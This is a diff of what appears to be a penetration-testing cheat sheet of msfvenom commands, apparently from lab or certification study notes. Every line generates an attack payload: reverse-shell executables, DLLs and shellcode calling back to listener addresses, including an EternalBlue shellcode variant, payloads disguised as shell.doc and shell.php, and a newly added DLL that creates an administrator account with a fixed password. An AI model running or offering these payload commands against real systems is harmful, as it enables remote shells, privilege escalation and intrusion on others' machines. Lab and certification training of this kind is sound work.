@@ -12,14 +12,17 @@ msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.178 LPORT=443 -o
 # For a DLL
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=6969 -f dll > phoneinfo.dll
 
+# For a DLL to add user
+msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
+
 # In the fixing exploits module for a thread
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 
 # Shell code, as for eternal blue
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=9090 EXITFUNC=thread -f raw -o wicked.bin
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=9090 EXITFUNC=thread -f raw > wicked.bin
 
 # VBA Macros
-msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh > shell.doc
 
 # Linux 64 bit PHP
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -f elf > shell.php
